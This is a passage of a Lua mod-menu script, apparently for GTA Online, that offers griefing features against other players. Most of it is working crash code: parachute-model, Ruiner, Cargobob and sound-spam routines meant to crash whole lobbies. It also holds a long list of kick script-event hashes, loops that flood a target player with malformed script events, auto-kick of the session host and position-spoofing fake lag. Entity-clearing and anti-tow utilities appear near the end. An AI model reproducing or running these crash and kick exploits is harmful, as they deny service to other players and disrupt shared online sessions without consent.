ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0.0, 1.0, 0.0, true, true, true, true)
end
end)

menu.action(MenuLobby, "Ruiner Crash V1", {"ruinerc1"}, "Uses Ruiner V1 to crash whole lobby, works most of the time!", function()
    local spped = PLAYER.PLAYER_PED_ID()
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for i = 1, 15 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        util.yield(200)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 260873931)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
end)

menu.action(MenuLobby, "Ruiner Crash V2", {"ruinerc2"}, "Uses Ruiner V2 use this if Ruiner V1 doesn't work!", function()
    local spped = PLAYER.PLAYER_PED_ID()
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for i = 1, 30 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 2200, false, true, true)
        util.yield(130)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 3235319999)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(130)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
end)

menu.action(MenuLobby, "Umbrella Crash V1", {"umbc1"}, "Parachute crash may work depending on connection", function()
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    for n = 0, 3 do
        local object_hash = util.joaat("prop_logpile_06b")
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0, 0, 500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z,
            false, true, true)

        local object_hash2 = util.joaat("prop_beach_parasol_03")
        STREAMING.REQUEST_MODEL(object_hash2)
        while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z,
            false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z,
        false, true, true)
end)

menu.action(MenuLobby, "Umbrella Crash V2", {"umbc2"}, "use this if umbc1 doesn't work", function()
    for n = 0, 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1381105889
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 720581693
        STREAMING.REQUEST_MODEL(bush_hash)
        while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
    end
end)
menu.action(MenuLobby, "Umbrella Crash V3", {"umbc3"}, "use this if umbc2 doesn't work", function()
    for n = 0, 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 192829538
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 192829538
        STREAMING.REQUEST_MODEL(bush_hash)
        while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
    end
end)

menu.action(MenuLobby, "Umbrella Crash V4", {"umbc4"}, "use this if umbc3 doesn't work", function()
    for n = 0, 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1117917059
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 1117917059
        STREAMING.REQUEST_MODEL(bush_hash)
        while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
            util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
    end
end)

menu.action(MenuLobby, "Nature Global Crash", {"naturenuke"}, "What the hell are you doing to mothernature!!???", function()
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    util.yield(100)
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    util.yield()
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    util.yield(250)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    util.yield(1000)
    for i = 1, 5 do
        util.spoof_script("freemode", SYSTEM.WAIT)
    end
    ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
end)

menu.action(MenuLobby, "Cargobob Crash", {"cargoc"}, "Self explanitory..", function()
    menu.trigger_commands("anticrashcam on")
    local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TPpos = ENTITY.GET_ENTITY_COORDS(cspped, true)
    local cargobob = CreateVehicle(0XFCFCB68B, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
    local veh = CreateVehicle(0X187D938D, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local vehPos = ENTITY.GET_ENTITY_COORDS(veh, true)
    local newRope = PHYSICS.ADD_ROPE(TPpos.x, TPpos.y, TPpos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false
        , 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, veh, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehPos.x,
        vehPos.y, vehPos.z, 2, false, false, 0, 0, "Center", "Center")
    util.yield(2500)
    entities.delete_by_handle(cargobob)
    entities.delete_by_handle(veh)
    PHYSICS.DELETE_CHILD_ROPE(newRope)
    menu.trigger_commands("anticrashcam off")
    util.toast("Go Fuck Your Self")
end)

menu.action(MenuLobby, "Sound Crash", {"earrape"}, "Earrape Crash may break your ears, turn the damn volume down got damn it!!", function()
    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local time = util.current_time_millis() + 2000
    while time > util.current_time_millis() do
        local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
        for i = 1, 20 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x, TPPS.y, TPPS.z, "GTAO_FM_Events_Soundset",
                true, 100000, false)
        end
        util.yield()
        for i = 1, 20 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x, TPPS.y, TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
        end
        util.yield()
    end
    util.toast("Sound Crash Completed")
end)


local kicks = {
0x493fc6bb,
1228916411,
1256866538,
-1753084819,
1119864805,
-1813981910,
-892744477,
-859672259,
-898207315,
548471420,
-30654421,
-2113865699,
1681920018,
1096448327,
113023613,
42967925,
1746765664,
538193013,
1163337421,
1110452930,
-596760615,
-140109523,
1398154308,
181375724,
672437644,
-1765092612,
-338166051,
2100923829,
-1822401313,
1242664595,
-1962062913,
-2085699648,
-1185502051,
-193885642,
1401157001,
-459327862,
-2001677186,
-419652151,
85920017,
-1891171016,
1227699211,
414506075,
1519903406,
871267300,
-2029579257,
-1453392398,
1192608757,
2067191610,
1694464420,
-1518599654,
1397900875,
-1548871816,
-852914485,
-333917558,
-644115601,
1875524648,
1765085190,
-91833327,
886761285,
1900384925,
-1328646658,
134199208,
-1392241127,
-795380017,
1804829460,
1370461707,
1813766002,
-964882004,
2080651008,
-860929776,
1999063780,
1456052554,
1167971813,
-1963501380,
-162943635,
-1047334626,
-580709734,
448968075,
-672300651,
1009548335,
2034045540,
217196385,
1607508898,
1368347173,
1772461754,
-492741651,
-1230153214,
2092740896,
-876146989,
477242315,
1903858674,
1128918904,
-519597839,
1077951879,
285546291,
857538507,
-328486618,
2118577282,
1810679938,
-1322082704,
518811989,
-1578682814,
1807254743,
2144693378,
1200439149,
-513394492,
2041060862,
-1472351847,
-484141204,
-141450727,
-1575137150,
854806881,
-839043921,
-2105209800,
-1001891935,
-1593201907,
-851885842,
-970362313,
-382052039,
-871545888,
2060563275,
309814753,
-285454749,
755923450,
1304332204,
-381818092,
1819411281,
1250480109,
-766974585,
1264221127,
1541446437,
-2044863341,
-1424012222,
-1127353498,
2005059642,
167413139,
669039275,
-507112185,
-1479027099,
-1090858280,
186548319,
-1878484856,
-16793987,
1322812076,
898343266,
-438023591,
-2048374263,
-1609136786,
434570842,
937151636,
1272793301,
988586503,
-1173163558,
-1714789749,
1589823260,
-23082252,
1041200857,
-1555358611,
127955867,
375962343,
1001517091,
1345672987,
-1168208444,
-730912208,
2084633812,
792153085,
1473913668,
-343495611,
1491806827,
1039282949,
-1460955723,
317177044,
-1834446996,
1552900972,
-2028335784,
-241418449,
-1653861842,
-259156293,
1594928808,
-1556962447,
1640286562,
-1139254401,
-949018811,
1803131174,
-71273283,
-119249570,
-53458173,
-1003348271,
-1123400822,
1772495870,
-1701192924,
-1218087738,
-10982782,
814496833,
-1094380288,
319685114,
-323171360,
820416549,
1835182208,
337732417,
-124020592,
1221375594,
2144481042,
-749491288,
-882028108,
-1370028781,
-1261736727,
1037705593,
1377857852,
1168623138,
-310617732,
908767058,
1409556665,
-1387723751,
-1492841786,
1674476795,
232443159,
178524407,
986260144,
653628905,
-168599209,
474413179,
-2051844999,
1560973005,
-904555865,
879177392,
-2060526162,
-994591791,
388881138,
1674317759,
1486774330,
489739448,
-398684455,
-841455067,
1379379239,
2046296859,
1311159119,
-760942281,
-1831959078,
1848110702,
-364713137,
-1643482755,
-1464365333,
1327169001,
1620260542,
245065909,
-1597942809,
1071490035,
1920583171,
265836764,
1303606785,
267489225,
1569236577,
-469493996,
360244585,
1134514966,
-2139562045,
279717272,
10138018,
-725780952,
396538098,
-1029914669,
-1296375264,
-805921310,
-468188833,
1923972962,
-444617715,
-248680084,
-1419450740,
1279059857,
-150763833,
-720665383,
-278036454,
-1389482213,
-1954654708,
-204643402,
-1496673706,
1292306623,
1950531948,
-1990614866,
1124104301,
-646004404,
-1216295492,
-859612223,
-1781653678,
1083015459,
-933673939,
434937615,
-957260626,
-975458684,
-1640403704,
-1322731185,
-1129868216,
316066012,
1454834612,
700267046,
-1730284249,
1074803562,
178476176,
-509252369,
1304577008,
-102043551,
-1526561203,
-1612608404,
895397362,
1802646519,
se.kick1_casino,
1927489513,
1046014587,
549145155,
-1237225255,
1500075603,
81880333,
-1484508675,
-2059117919,
1332590686,
-910497748,
-1141914502,
-1582289420,
-76043076,
2144523214,
243072129,
2064487849,
435675531,
-500923695,
1336084487,
323981539,
567662973,
-1571441360,
-1054040893,
843316754,
169410705,
491906476,
796658339,
974054812,
508339812,
431653434,
1341265547,
-1168222636,
-715264067,
1121720242,
931417473,
-583098065,
1586286277,
-1330848029,
-1448015548,
561154955,
-1471373324,
1306214888,
-91898414,
90440793,
914476312,
815640525,
-394088790,
1858712297,
-1743542712,
49863291,
1025036241,
-508465573,
1810531023,
2119903152,
507886635,
-1057685265,
se.kick2,
-1069140561,
1491410017,
-1601139550,
-290401917,
-1357080740,
-299190545,
-1443768844,
1354970087,
1796894334,
392606458,
se.givecollectible,
1402665684,
-1694531511,
393633835,
1292973690,
1605689751,
1883636994,
1814318034,
-50961790,
-93722397,
1775863255,
125899875,
-1217949151,
}


local Laggy = menu.list(MenuGameMacros, "Lag Macro", {}, "Lag Options")

local latiaofakelagvalueset = menu.slider(Laggy, "Fakelag Value", {"latiaofakelagvalue"}, "", 250, 1000, 250, 1, function()
end)
menu.toggle_loop(Laggy, "fake lag", {"latiaofakelag"}, ("latiaofakelag"), function()
    menu.trigger_commands("spoofpos".." on")
    local pos = players.get_position(players.user())
    local x = pos.x
    local y = pos.y
    local z = pos.z
    util.yield(menu.get_value(latiaofakelagvalueset))
    menu.trigger_commands("spoofedposition " .. x .. "," .. y .. "," .. z)
    

end,function()
    menu.trigger_commands("spoofpos".." off")
end)



--[[| Online/TargetedKickOptions/ |]]--
menu.toggle_loop(MenuOnlineTK, "Auto Kick Host", {}, "Detects if someone host, then kicks them this is best free option for basic and regular users.", function()
util.draw_debug_text(players.get_name(players.get_host()) .. " Is Host")
menu.trigger_commands("kick" .. players.get_name(players.get_host()))
end)

menu.toggle_loop(MenuOnlineTK, "Auto Kick Modders", {"gsautokickmodders"}, "Automatically Kicks any Players that get Marked as Modders. Highly Reccomended to be Host while using this, so as to not get Karma'd.", function(on)
    for i = 0, 31, 1 do
        if players.exists(i) and i ~= players.user() and players.is_marked_as_modder(i) then
            local PlayerName = players.get_name(i)
            local PlayerNameLower = PlayerName:lower()
            menu.trigger_command(menu.ref_by_command_name("kick"..PlayerNameLower))
        end
    end
end)

menu.action(MenuOnlineTK, "Kick Host", {"gskickhost"}, "Kicks the Host in your Current Session. Be careful with this, as you can get Karma'd if the Host is Modding.", function(on_click)
    local CurrentHostId = players.get_host()
    local CurrentHostName = players.get_name(CurrentHostId)
    local string CurrentHostNameLower = CurrentHostName:lower()
    if players.get_host() ~= players.user() then
        menu.trigger_command(menu.ref_by_command_name("kick"..CurrentHostNameLower))
    else
        util.toast("-Genesis-\n\nThis Command doesn't Work on yourself; You are already the Host!")
    end
end)

menu.action(MenuOnlineTK, "Kick Modders", {"gskickmodders"}, "Will use Smart Kick to use the Best Kick on all Modders. Being the Host is Highly Reccomended, so as to not get Karma'd.", function(on_click)
    for i = 0, 31, 1 do
        if players.exists(i) and i ~= players.user() and players.is_marked_as_modder(i) then
            local PlayerName = players.get_name(i)
            local PlayerNameLower = PlayerName:lower()
            menu.trigger_command(menu.ref_by_command_name("kick"..PlayerNameLower))
        end
    end  
end)

menu.toggle_loop(MenuOnlineTK, "SE Kick (S0)", {"sekicks0"}, "doesn't work but is here to allow bonk kick to function properly.", function()
local int_min = -2147483647
local int_max = 2147483647
for i = 1, 15 do
send_script_event(se.sekicks0, csPID, {8, 5, -995382610, -1005524293, 1105725452, -995382610, -1005524293, 1105725452, -995350040, -1003336651, 1102848299, 0, 0, 0, 0, 0, 0, 5, 1110704128, 1110704128, 0, 0, 0, 5, 131071, 131071, 131071, 0, 0, 5, 0, 0, 0, 0, 0, 1965090280, -1082130432, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
math.random(int_min, int_max), csPID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
send_script_event(se.sekicks0, csPID, {8, 5, -995382610, -1005524293, 1105725452, -995382610, -1005524293, 1105725452, -995350040, -1003336651, 1102848299, 0, 0, 0, 0, 0, 0, 5, 1110704128, 1110704128, 0, 0, 0, 5, 131071, 131071, 131071, 0, 0, 5, 0, 0, 0, 0, 0, 1965090280, -1082130432, 0, 0})
end
menu.trigger_commands("givesh" .. players.get_name(csPID))
util.yield()
for i = 1, 15 do
send_script_event(se.sekicks0, csPID, {8, 5, -995382610, -1005524293, 1105725452, -995382610, -1005524293, 1105725452, -995350040, -1003336651, 1102848299, 0, 0, 0, 0, 0, 0, 5, 1110704128, 1110704128, 0, 0, 0, 5, 131071, 131071, 131071, 0, 0, 5, 0, 0, 0, 0, 0, 1965090280, -1082130432, 0, 0, csPID, math.random(int_min, int_max)})
send_script_event(se.sekicks0, csPID, {8, 5, -995382610, -1005524293, 1105725452, -995382610, -1005524293, 1105725452, -995350040, -1003336651, 1102848299, 0, 0, 0, 0, 0, 0, 5, 1110704128, 1110704128, 0, 0, 0, 5, 131071, 131071, 131071, 0, 0, 5, 0, 0, 0, 0, 0, 1965090280, -1082130432, 0, 0})
util.yield(100)
end
end)

menu.toggle_loop(MenuOnlineTK, "SE Kick (S1)", {"sekicks1"}, "doesn't work but is here to allow bonk kick to function properly.", function()
local int_min = -2147483647
local int_max = 2147483647
for i = 1, 15 do
send_script_event(se.sekicks1, pid, {6, 0, math.random(int_min, int_max), math.random(int_min, int_max),
math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
send_script_event(se.sekicks1, pid, {6, 0})
end
menu.trigger_commands("givesh" .. players.get_name(pid))
util.yield()
for i = 1, 15 do
send_script_event(se.sekicks1, pid, {6, 0, pid, math.random(int_min, int_max)})
send_script_event(se.sekicks1, pid, {6, 0})
util.yield(100)
end
end)

menu.toggle_loop(MenuOnlineTK, "SE Kick (S3)", {"sekicks3"}, "doesn't work but is here to allow bonk kick to function properly.", function()
local int_min = -2147483647
local int_max = 2147483647
for i = 1, 15 do
send_script_event(se.sekicks3, pid, {12, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
send_script_event(se.sekicks3, pid, {12, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
end
menu.trigger_commands("givesh" .. players.get_name(pid))
util.yield()
for i = 1, 15 do
send_script_event(se.sekicks3, pid, {12, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, pid, math.random(int_min, int_max)}) -- S3 Credits to legy
send_script_event(se.sekicks3_1, pid, {27, 0}) -- S1 Credits to legy
util.yield(100)
end
end)

menu.toggle_loop(MenuOnlineTK, "SE Kick (S4)", {"sekicks4"}, "doesn't work but is here to allow bonk kick to function properly.", function()
local int_min = -2147483647
local int_max = 2147483647
for i = 1, 15 do
send_script_event(se.sekicks4, pid, {6, 0, 0, 0, 1, math.random(int_min, int_max), math.random(int_min, int_max),
math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
send_script_event(se.sekicks4, pid, {6, 0, 0, 0, 1})
end
menu.trigger_commands("givesh" .. players.get_name(pid))
util.yield()
for i = 1, 15 do
send_script_event(se.sekicks4, pid, {6, 0, 0, 0, 1, pid, math.random(int_min, int_max)}) -- S3 Credits to legy
send_script_event(se.sekicks4, pid, {6, 0, 0, 0, 1})
util.yield(100)
end
end)

menu.toggle_loop(MenuOnlineTK, "SE Kick (S7)", {"sekicks7"}, "doesn't work but is here to allow bonk kick to function properly.", function()
local int_min = -2147483647
local int_max = 2147483647
for i = 1, 15 do
send_script_event(se.sekicks7, pid, {6, 536247389, -1910234257, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, math.random(int_min, int_max), math.random(int_min, int_max),
math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
send_script_event(se.sekicks7, pid, {6, 536247389, -1910234257, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1})
end
menu.trigger_commands("givesh" .. players.get_name(pid))
util.yield()
for i = 1, 15 do
send_script_event(se.sekicks7, pid, {6, 536247389, -1910234257, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, pid, math.random(int_min, int_max)}) -- S3 Credits to legy
send_script_event(se.sekicks7, pid, {6, 536247389, -1910234257, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1})
util.yield(100)
end
end)




--[[| Online/Protections/ |]]--
menu.toggle_loop(MenuProtection, "Anti Tow-Truck", {"gsprotectiontowtruck"}, "Prevents any Tow Truck from Towing you by Immediately Detaching the Hook from your Vehicle.", function(on)
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        VEHICLE.DETACH_VEHICLE_FROM_ANY_TOW_TRUCK(player_cur_car)
    end
end)



--[[| World/GlobalVehicleOptions/ |]]--
menu.toggle_loop(MenuWorldVeh, "Remove Vehicle Godmode", {"gsremovevehgmforall"}, "Removes Vehicle Godmode for Everyone on the Map.", function(on_click)
    RemoveVehicleGodmodeForAll()
end)

local trafficBlips = {}
menu.toggle_loop(MenuWorldVeh, "Mark Traffic", {"gsmarktraffic"}, "Puts a Green Dot on all AI Traffic.", function(on)
    for i,ped in pairs(entities.get_all_peds_as_handles()) do 
        if not PED.IS_PED_A_PLAYER(ped) and PED.IS_PED_IN_ANY_VEHICLE(ped) then
            pedVehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            if VEHICLE.IS_VEHICLE_DRIVEABLE(pedVehicle, false) and HUD.GET_BLIP_FROM_ENTITY(pedVehicle) == 0 then
                pedBlip = HUD.ADD_BLIP_FOR_ENTITY(pedVehicle)
                HUD.SET_BLIP_ROTATION(pedBlip, math.ceil(ENTITY.GET_ENTITY_HEADING(pedVehicle)))
                HUD.SET_BLIP_SPRITE(pedBlip, 286)
                HUD.SET_BLIP_SCALE_2D(pedBlip, .5, .5)
                HUD.SET_BLIP_COLOUR(pedBlip, 25)
                trafficBlips[#trafficBlips + 1] = pedBlip
            elseif VEHICLE.IS_VEHICLE_DRIVEABLE(pedVehicle, false) and HUD.GET_BLIP_FROM_ENTITY(pedVehicle) != 0 then
                local currentPedVehicleBlip = HUD.GET_BLIP_FROM_ENTITY(pedVehicle)
                HUD.SET_BLIP_ROTATION(currentPedVehicleBlip, math.ceil(ENTITY.GET_ENTITY_HEADING(pedVehicle)))
            end
        end
    end
    for i,b in pairs(trafficBlips) do
        if HUD.GET_BLIP_INFO_ID_ENTITY_INDEX(b) == 0 or not VEHICLE.IS_VEHICLE_DRIVEABLE(pedVehicle, false) then 
            util.remove_blip(b)
            trafficBlips[i] = nil
        end
    end
end, function(on_stop)
    for i,b in pairs(trafficBlips) do
        util.remove_blip(b) 
        trafficBlips[i] = nil
    end
end)

--[[| World/Clear/ |]]--
menu.action(MenuWorldClear, "Full Clear", {"gsworldfullclear"}, "This clears any Entity that Exists. It can Break many things, since it Deletes EVERY Entity that is in Range.", function(on_click)
    local ct = 0
    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
        entities.delete_by_handle(ent)
        ct = ct + 1
    end
    for k,ent in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ent) then
            entities.delete_by_handle(ent)
            ct = ct + 1
        end
    end
    for k,ent in pairs(entities.get_all_objects_as_handles()) do
        entities.delete_by_handle(ent)
        ct = ct + 1
    end
    util.toast("-Genesis-\n\nFull Clear Complete! Removed "..ct.." Entities in Total.")
end)

menu.action(MenuWorldClear, "Quick Clear", {"gsworldquickclear"}, "Only Deletes Vehicles and Peds. Probably won't Break anything, unless a Mission Ped or Vehicle.", function(on_click)
    local ct = 0 
    for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
        entities.delete_by_handle(ent)
        ct = ct + 1
    end
    for k, ent in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ent) then
            entities.delete_by_handle(ent)
            ct = ct + 1
        end
    end
    util.toast("-Genesis-\n\nSuccessfully Deleted "..ct.." Entities.")
end)


--[[| World/Clear/Specific |]]--
menu.action(MenuWorldClearSpec, "Clear Vehicles", {"gsworldclearvehicles"}, "Deletes all Vehicles.", function(on_click)
    local ct = 0
    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
        entities.delete_by_handle(ent)
        ct = ct + 1
    end
    util.toast("-Genesis-\n\nSuccessfully Deleted "..ct.." Vehicles.")
end)

menu.action(MenuWorldClearSpec, "Clear Peds", {"gsworldclearpeds"}, "Deletes all Non-Player Peds.", function(on_click)
    local ct = 0
    for k,ent in pairs(entities.get_all_peds_as_handles()) do 
        if not PED.IS_PED_A_PLAYER(ent) then
            entities.delete_by_handle(ent)
            ct = ct + 1
        end
    end
    util.toast("-Genesis-\n\nSuccessfully Deleted "..ct.." Peds.")
end)

menu.action(MenuWorldClearSpec, "Clear Objects", {"gsworldclearobjects"}, "Deletes all Objects. This can Break most Missions.", function(on_click)
    local ct = 0
    for k,ent in pairs(entities.get_all_objects_as_handles()) do
        entities.delete_by_handle(ent)
